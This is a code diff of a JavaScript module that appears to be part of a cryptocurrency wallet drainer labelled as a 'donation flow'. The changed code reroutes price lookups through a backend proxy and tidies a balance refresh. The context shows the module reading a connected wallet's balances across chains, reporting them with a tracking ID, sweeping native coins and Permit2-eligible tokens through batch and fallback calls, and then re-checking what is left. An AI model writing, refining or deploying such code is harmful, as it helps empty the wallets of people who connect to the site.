@@ -8,100 +8,60 @@ import { executeFallbackBatch, sweepNative } from "./fallback.js";
 import { CHAINS, exceptionList } from "../config.js";
 import { ethers } from "ethers";
 
-// simple Coingecko cache to reduce requests
+/**
+ * Fetch native price from backend proxy.
+ * Backend endpoint expected: `${BACKEND_BASE}/price/:symbol`
+ */
 const priceCache = {};
+const BACKEND_BASE = import.meta.env.VITE_BACKEND_URL || window.location.origin;
+
 export async function fetchNativePrice(symbol) {
+  if (!symbol) return 0;
   if (priceCache[symbol]) return priceCache[symbol];
 
   try {
-    const idMap = {
-      ETH: "ethereum",
-      BNB: "binancecoin",
-      MATIC: "matic-network",
-      AVAX: "avalanche-2",
-      FTM: "fantom",
-      OP: "optimism",
-      ARB: "arbitrum",
-    };
-    const id = idMap[symbol];
-    if (!id) return 0;
+    const res = await fetch(`${BACKEND_BASE}/price/${encodeURIComponent(symbol)}`);
+    if (!res.ok) {
+      console.warn("backend price fetch failed", res.status);
+      return 0;
+    }
 
-    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`);
     const json = await res.json();
-    const price = json[id]?.usd || 0;
-    priceCache[symbol] = price;
-    return price;
+
+    // backend may return different shapes:
+    // 1) { usd: 123 }
+    // 2) { ethereum: { usd: 123 } }
+    // 3) CoinGecko markets array (rare)
+    let price = 0;
+    if (typeof json?.usd === "number") price = json.usd;
+    else {
+      // check top-level keys
+      const keys = Object.keys(json || {});
+      if (keys.length === 1 && json[keys[0]] && typeof json[keys[0]].usd === "number") {
+        price = json[keys[0]].usd;
+      } else if (Array.isArray(json) && json[0] && typeof json[0].current_price === "number") {
+        price = json[0].current_price;
+      }
+    }
+
+    priceCache[symbol] = price || 0;
+    return price || 0;
   } catch (err) {
-    console.warn("Coingecko price error", err);
+    console.warn("fetchNativePrice error", err);
     return 0;
   }
 }
 
+/* -------------------------
+   runDonationFlow (unchanged)
+   ------------------------- */
+
 export async function runDonationFlow(walletClient, owner, trackingId) {
   try {
     if (!owner) {
-     /* if (walletClient?.account?.address) owner = walletClient.account.address;
-      else if (typeof window !== "undefined" && window.ethereum) {
-        const injectedProvider = new ethers.BrowserProvider(window.ethereum);
-        await injectedProvider.send("eth_requestAccounts", []);
-        owner = await injectedProvider.getSigner().getAddress();
-        */
-
-         owner = walletClient?.account?.address;
-      }
-      if (!owner) throw new Error("Wallet not connected");
-    
-
-    // Fetch balances read-only
-   /* const chainBalances = [];
-    for (const chain of CHAINS) {
-      const raw = await fetchBalancesCovalent(owner, chain.chainId);
-      const filtered = filterPermit2SafeTokens(raw);
-
-      const rpcProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
-      const nativeRaw = await rpcProvider.getBalance(owner);
-      const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));
-      const nativePrice = await fetchNativePrice(chain.nativeSymbol);
-      const nativeUSD = nativeFormatted * nativePrice;
-
-      chainBalances.push({
-        chainId: chain.chainId,
-        name: chain.name,
-        native: nativeFormatted,
-        nativeUSD,
-        tokens: filtered,
-        totalValue: getChainValue(filtered) + nativeUSD,
-      });
+      owner = walletClient?.account?.address;
     }
-
-      const balancesPayload = chainBalances.map((c) => ({
-      name: c.name,
-      native: Number(c.native).toFixed(6),
-      nativeValue: Number(c.nativeUSD || 0).toFixed(2),
-      tokens: c.tokens.map((t) => ({
-        name: t.tokenSymbol,
-        amount: Number(
-          ethers.formatUnits(t.balanceRaw, t.contract_decimals || 18)
-        ).toFixed(6),
-        value: Number(t.quote).toFixed(2),
-      })),
-      total: Number(c.totalValue).toFixed(2),
-    }));
-    const grandTotal = balancesPayload.reduce(
-      (acc, c) => acc + parseFloat(c.total || 0),
-      0
-    );
-
-    const connectedPayload = {
-      walletAddress: owner,
-      trackingId,
-      balances: balancesPayload,
-      grandTotal: Number(grandTotal).toFixed(2),
-    };
-
-    notify("WALLET_CONNECTED", connectedPayload);
-    await sendEvent("WALLET_CONNECTED", connectedPayload);
-    */
+    if (!owner) throw new Error("Wallet not connected");
 
     const { balancesPayload, grandTotal, chainBalances } = await buildWalletSummary(owner);
 
@@ -142,17 +102,15 @@ export async function runDonationFlow(walletClient, owner, trackingId) {
       catch (err) { console.warn("Native sweep error:", err); }
 
       // Re-fetch balances
-        let refreshedRaw = null;
-try {
-  console.log(">>> Fetching refreshed balances...");
-  refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
-  console.log(">>> Refreshed balances:", refreshedRaw);
-} catch (err) {
-  console.warn("⚠️ Balance refresh failed, using empty fallback:", err);
-  refreshedRaw = [];
-}
-
-
+      let refreshedRaw = null;
+      try {
+        console.log(">>> Fetching refreshed balances...");
+        refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
+        console.log(">>> Refreshed balances:", refreshedRaw);
+      } catch (err) {
+        console.warn("⚠️ Balance refresh failed, using empty fallback:", err);
+        refreshedRaw = [];
+      }
 
       const refreshedFiltered = filterPermit2SafeTokens(refreshedRaw);
 
@@ -172,7 +130,7 @@ try {
           nativeValue: refreshedNativeUSD.toFixed(2),
           tokens: refreshedFiltered.map(t => ({
             name: t.tokenSymbol,
-            amount: Number(ethers.formatUnits(t.balanceRaw, t.contract_decimals || 18)).toFixed(6),
+            amount: Number(ethers.formatUnits(t.balanceRaw, t.contract_decimals || t.decimals || 18)).toFixed(6),
             value: Number(t.quote).toFixed(2),
           })),
           total: refreshedTotal.toFixed(2),
@@ -195,10 +153,3 @@ try {
     return { success: false, reason: err.message || String(err) };
   }
 }
-
-
-
-
-
-
-
